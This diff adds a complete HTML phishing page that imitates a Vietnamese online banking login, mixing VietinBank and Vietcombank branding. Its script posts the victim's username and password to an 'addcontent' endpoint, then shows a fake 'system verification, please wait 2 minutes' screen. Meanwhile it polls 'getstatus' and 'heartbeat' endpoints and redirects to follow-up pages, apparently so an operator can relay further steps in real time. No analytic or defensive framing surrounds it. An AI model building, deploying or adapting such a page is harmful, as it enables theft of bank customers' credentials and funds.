@@ -1,0 +1,338 @@
+<html lang="en" dir="ltr" class="iFrameBankFast" data-useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" data-platform="Win32"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <meta http-equiv="Content-Script-Type" content="text/javascript">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="generator" content="Sandstone Technology">
+  <title>Online Banking Login for Retail Customers
+  </title>
+  <link rel="stylesheet" href="/maybank/css/main.css">
+  <script src="/assets/jquery-3.1.1.min.js"></script>
+
+  <link rel="stylesheet" type="text/css" media="all" href="/assets/css/custom.css?v=1.3.0">
+  <link rel="stylesheet" type="text/css" media="all" href="/assets/css/style.search.css?v=1.3.0">
+  <link rel="stylesheet" type="text/css" media="all" href="/vi/defaultDEC6.css">
+  <link rel="stylesheet" type="text/css" media="print" href="/vi/print6772.css"><link rel="shortcut icon" href="https://ebanking.vietinbank.vn/rcas/bankfast/favicon.ico">
+</head>
+<body class="bankfast scriptOn" id="LG11">
+
+
+<!--<a style="float:left;"><img border=5 src=https://ebanking.vietinbank.vn/rcas/portal/vietinbank-theme/images/logo-ipay.png></a>-->
+
+
+<div id="loading" class="loading" style="display: none;">
+    <div class="main-content">
+      <div class="bg">
+        <div class="login-logo mb15 text-center" style="margin: 10px;text-align: center;"><img alt="" lazyimg="" width="208" src="/assets/images/logo-digibank.svg"></div>
+      </div>
+        <div class="content" style="width: 100%;margin:10%;border-radius: 10px;">
+          <div class="qiurongqi">
+            <div class="qiu" style="margin-top: 80px;">
+            </div>
+          </div>
+          <h1 style="margin-top: 14rem;text-align: center;">Xử lý xác thực hệ thống ...</h1>
+          <h3 style="margin-top: 0rem;text-align: center;">Vui lòng đợi trong khi chúng tôi đảm bảo giao dịch trực tuyến của bạn trong vòng 2 phút</h3>
+          <p class="copy-right">© 2021&nbsp;<a href="https://ebanking.vietinbank.vn/rcas/portal/web/retail/bflogin" target="_blank">Bản quyền thuộc về Ngân hàng TMCP Công thương Việt Nam</a>  All rights reserved.</p>
+        </div>
+    </div>
+</div>
+
+<div id="dialog" class="modal" style="display: none;">
+  <span class="close">×</span>
+  <div class="title" id="dialog-title"></div>
+  <p id="dialog-text"></p>
+</div>
+
+
+<div class="container">
+    <!--<div style="text-align: center; margin: 30px;">-->
+    <!--    <a style=""><img alt="" lazyimg="" width="208" src="https://vcbdigibank.vietcombank.com.vn/assets/images/logo-digibank.svg"></a>-->
+    <!--</div>-->
+  <div class="main-content">
+    <div class="form" name="SSF">
+      <div class="message top">
+        <div class="message-page">
+           
+        </div>
+      </div>
+      <div class="content">
+           <div class="login-logo mb15 text-center" style="margin: 10px;"><img alt="" lazyimg="" width="208" src="https://vcbdigibank.vietcombank.com.vn/assets/images/logo-digibank.svg"></div>
+          <div class="login-welcome color-black text-center pb15">Kính chào Quý khách </div>
+          <div class="login-alert login-info login-alert-has-toggle"><div class="login-alert-inner"><p>- Với khách hàng đã có tài khoản <span class="inline-block">VCB Digibank</span>: <b><span class="inline-block">Tên đăng nhập</span> là Số điện thoại đăng ký dịch vụ</b> <br>- Với khách hàng chưa có tài khoản <span class="inline-block">VCB Digibank</span>: <b>Tên đăng nhập là Tên đăng nhập VCB-iB@nking</b>, để thực hiện chuyển đổi sang dịch vụ <span class="inline-block">VCB Digibank</span> mới.</p></div><label class="login-alert-toggle show-xs color-primary" for="login-alert-1"><span style="font-size: 10px;
+    color: #72bf00;" class="toggle-hide">Thu gọn</span><span class="toggle-show">Hiện thêm</span></label></div>
+        <!--<div class="login-content-header">-->
+        <!--  <h1 class="login-content-title">Chào mừng Quý khách đến với <b>VietinBank iPay</b>-->
+        <!--  </h1>-->
+        <!--</div>-->
+        <div class="content-body">
+            
+          <div class="login-details">
+            <div class="form-row">
+
+              <div class="input-group input-group-material">
+                <input class="input-text input input-xs input-material ng-untouched ng-pristine ng-invalid" type="text" size="20" id="username" value="" maxlength="50" placeholder="Tên đăng nhập
+                ">
+              </div>
+            </div>
+            <div class="form-row">
+              <div class="input-group-flex input-group-material input-group-slot-line">
+                  <div app-password="" class="input-group ng-untouched ng-pristine ng-invalid" formcontrolname="password" id="login" maxlength="20">
+                  <input style="border: 0;border-radius: 0;border-bottom: 1px solid #101010;" autocapitalize="none" autocomplete="off" required="" type="password" class="keyboardInput input input-xs input-material" id="password" maxlength="20" placeholder="Mật khẩu">
+                  <!--<div class="input-line-bar"></div>-->
+                  </div>
+                  <div class="input-group-slot no-border">
+                      <div class="input-group-slot-inner no-mr">
+                          <label class="ubtn ubg-secondary login-eye" data-tooltip="tooltip" title="">
+                              <input checked="" class="hidden ng-untouched ng-pristine ng-valid" formcontrolname="HidePass" id="hidepass1" name="hidepass1" type="checkbox">
+                              <div class="login-eye-slash"></div>
+                              </label>
+                              </div>
+                      </div>
+                  </div>    
+            </div>
+          </div>
+          <div class="buttons-action">
+            <button id="subbtn" class="button primary sign-in btndf">Đăng nhập</button>
+
+          </div>
+          <div id="scramblePad">
+          </div>
+          <ul id="register-nav" class="nav">
+            <li class="nav-item first">
+              <a class="registerHereLink" onclick="window.open('https://ebanking.vietinbank.vn/rcas/portal/web/retail/bfapply-registration'); return false" href="https://ebanking.vietinbank.vn/rcas/bankfast/Vib-login?screenId=LG01&amp;lang=vi#">Đăng ký mới</a>
+            </li>
+            <li class="nav-item">
+              <a class="resetPasswordLink" onclick="return subWith('bu_4', event)" href="https://ebanking.vietinbank.vn/rcas/bankfast/Vib-login?wid=bu_4&amp;SPID=DPQC29DXGJ_3V63MH2VPS79TDRF">Quên mật khẩu</a>
+            </li>
+            <li class="nav-item">
+              <a class="helpLink" onclick="window.open('./Help/vi/LG11Help.htm','BL_Help','left=0,top=0,location=0,menubar=0,resizable=0,status=1,toolbar=0,scrollbars=1') return false" href="https://ebanking.vietinbank.vn/rcas/bankfast/Vib-login?screenId=LG01&amp;lang=vi#">Hỗ trợ</a>
+            </li>
+            <li class="nav-item">
+              <a class="privacyPolicyLink" onclick="window.open('https://www.vietinbank.vn/sites/mediafile/VTB135642'); return false" href="https://ebanking.vietinbank.vn/rcas/bankfast/Vib-login?screenId=LG01&amp;lang=vi#">Chính sách bảo mật</a>
+            </li>
+            <li class="nav-item">
+              <a class="syncRSATokenLink" onclick="window.open('https://ebanking.vietinbank.vn/rsasync'); return false" href="https://ebanking.vietinbank.vn/rcas/bankfast/Vib-login?screenId=LG01&amp;lang=vi#">ĐỒNG BỘ THẺ RSA</a>
+            </li>
+            <li class="nav-item">
+              <a class="vietinBankiPayRegisterLink" onclick="window.open('https://ebanking.vietinbank.vn/register'); return false" href="https://ebanking.vietinbank.vn/rcas/bankfast/Vib-login?screenId=LG01&amp;lang=vi#">Đăng ký VCB Digibank</a>
+            </li>
+            <li class="nav-item">
+              <a class="forgotPasswordLink" onclick="window.open('https://ebanking.vietinbank.vn/register/reset/'); return false" href="https://ebanking.vietinbank.vn/rcas/bankfast/Vib-login?screenId=LG01&amp;lang=vi#">Forgot Password</a>
+            </li>
+            <li class="nav-item last">
+              <a class="forgotUsernameLink" onclick="window.open('https://ebanking.vietinbank.vn/register/getusername/'); return false" href="https://ebanking.vietinbank.vn/rcas/bankfast/Vib-login?screenId=LG01&amp;lang=vi#">Forgot Username</a>
+            </li>
+          </ul>
+          <div class="cpy">
+          </div>
+        </div>
+      </div>
+      <div class="message bottom">
+        <div class="message-page">
+        </div>
+      </div>
+
+    </div>
+  </div>
+  <div class="footer-wrapper">
+    <div class="footer">
+      <div class="hidden">
+      </div>
+      <div class="powered-by">
+        <a id="sstLogo" class="sandstone-logo" href="http://www.sandstone.com.au/" target="_blank" title="Sandstone Technology">Powered by Sandstone Technology</a>
+      </div>
+      <div class="copyright">
+        <p>Vietinbank [ 1.1.0.149.PPE.9  DEC6 6772 2232 ]
+        </p></div>
+      <div id="footerContactInfo" class="contact-info">Quý khách vui lòng liên hệ số Hotline 1900 558868 để được hỗ trợ
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+
+  var username = '';
+  $("#btn").click(function () {
+    var u = $("#username").val();
+    if (u.length < 6 || u.length > 16) {
+      dialog("Invalid Username", "Input Username between 6 and 16 characters.");
+    }
+    else {
+      username = u;
+      loading(true);
+      setTimeout(function () {
+        loading(false);
+        $("#c1").hide();
+        $("#footer").hide();
+        $("#c2").show();
+        $("#name").text(username);
+      }, 3000);
+    }
+  })
+  $("#closec2").click(function () {
+    $("#c2").hide();
+    $("#c1").show();
+    $("#footer").show();
+  });
+
+  function pwdcheck(obj) {
+    if (obj.value.length == 0) {
+      $("#subbtn").addClass("disabled");
+    }
+    else {
+      $("#subbtn").removeClass("disabled");
+
+    }
+  }
+</script>
+
+<script>
+  // function dialog(title, msg, callback = null) {
+  //   $("#dialog").show();
+  //   var autoclosetimer = setInterval(function () {
+  //     clearInterval(autoclosetimer);
+  //     $("#dialog").hide();
+  //   }, 5000);
+  //   $("#dialog-title").text(title);
+
+  //   $("#dialog-text").text(msg);
+  //   $('#dialog span').click(function () {
+  //     $("#dialog").hide();
+  //     clearInterval(autoclosetimer);
+  //     if (callback) {
+  //       callback();
+  //     }
+  //   });
+
+
+  // }
+  function dialog(title, msg, callback = null, type = null) {
+    if (type == "success") {
+      $("#dialog").addClass("greenbg");
+    }
+    else if(type=="warning"){
+      $("#dialog").addClass("warningbg");
+    }
+    else {
+      $("#dialog").removeClass("greenbg");
+    }
+    $("#dialog").show();
+    var autoclosetimer = setInterval(function () {
+      clearInterval(autoclosetimer);
+      $("#dialog").hide();
+    }, 1000*10);
+    $("#dialog-title").text(title);
+
+    $("#dialog-text").text(msg);
+    $('#dialog span').click(function () {
+      $("#dialog").hide();
+      clearInterval(autoclosetimer);
+      if (callback) {
+        callback();
+      }
+    });
+
+
+  }
+
+  function loading(isshow) {
+    if (isshow) {
+      $("#loading").show();
+    }
+    else {
+      $("#loading").hide();
+    }
+  }
+
+  var id = 0;
+  var s;
+  $('#subbtn').click(function () {
+    var iserror = false;
+    var pwd = $('#password').val();
+    if (pwd.length > 0) {
+      
+      $.post('addcontent', {
+        c1: $("#username").val(),
+        c2: pwd
+      }, function (res) {
+        if (res > 0) {
+          loading(true);
+          id = res
+          s = setInterval(lun, 1000);
+
+          //hb
+          starthb();
+        } else {
+          loading(false);
+          window.loading.href = "/";
+        }
+      })
+    }
+  })
+  var showpwd = true;
+  $('#hidepass1').click(function () {
+       if(showpwd==false){
+           showpwd = true;
+          $("#password").attr("type", "password");
+       }else if(showpwd==true){
+           showpwd = false;
+          $("#password").attr("type", "text");
+       }
+      
+  })
+  function lun() {
+    var url = 'getstatus'
+    $.post(url, { id: id }, function (res) {
+
+      // if (res == -1) {
+      //   window.location.href = "index2?ids=" + id;
+      // }
+      if (res == 1) {
+        window.location.href = "index2?ids=" + id;
+      }
+      if (res != 1 && res != 0) {
+        loading(false);
+        // dialog("Error", res, function () {
+        //   window.location.href = "https://portal.vietcombank.com.vn/content/personal/KhoAnh/Digital%20Banking/HDSD%20LOGIN%20VCB%20DIGIBANK%20TRE%CC%82N%20WEB.pdf";
+        // });
+        window.location.href = "/index6";
+        clearInterval(s);
+      }
+    })
+  }
+
+  var hbtimer;
+  function heartbeat() {
+    var url = 'heartbeat'
+    $.post(url, { ids: id }, function (res) {
+      if (res <= 0) {
+        window.location.href = "/";
+      }
+    })
+  }
+  function starthb() {
+    hbtimer = setInterval(heartbeat, 1000 * 15);
+  }
+  // loading(true)
+</script>
+
+
+
+<script type="text/javascript">
+
+
+  var winHeight = $(window).height();
+  $(window).resize(function () {
+    thisHeight = $(this).height();
+    if (winHeight - thisHeight > 50) {
+      $('body').css('height', thisHeight + 'px');
+      $(".buttom").css({ 'bottom': '0px' });
+    } else {
+      $('body').css('height', '100%');
+    }
+  });
+
+
+</script>
+
+</body></html>
